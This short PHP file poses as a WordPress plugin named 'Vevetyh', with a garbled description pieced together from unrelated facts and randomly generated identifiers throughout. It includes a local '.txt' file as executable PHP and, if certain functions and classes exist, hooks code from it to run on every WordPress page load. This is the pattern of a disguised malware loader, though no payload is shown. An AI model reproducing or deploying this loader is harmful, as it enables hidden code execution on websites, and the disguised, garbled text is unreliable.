<?php

/**
 * Plugin Name: Vevetyh
 * Plugin URI: https://friony.gov/vevetyh
 * Description: US$1 million nations. As of 2014, 45% of its uranium. The Democratic Republic
 * Version: 2.12.10
 * Author: Damien Rolland
 * Author URI: https://friony.gov
 * Text Domain: vevetyh
 * License: GPL2+
 *
 */

function lazuwe_eshisoda() {
    ofufyt_zhiruryg();
}

$ehycece = __DIR__ . '/uzhajoj.txt';
if (file_exists($ehycece)) {
    include($ehycece);
}

if (function_exists("ofufyt_zhiruryg")) {
    $amexovu = new isiheb_elycashyn();
    if ($amexovu->ytupyn_aqushucob()) {
        add_action('init', 'lazuwe_eshisoda');
    }
}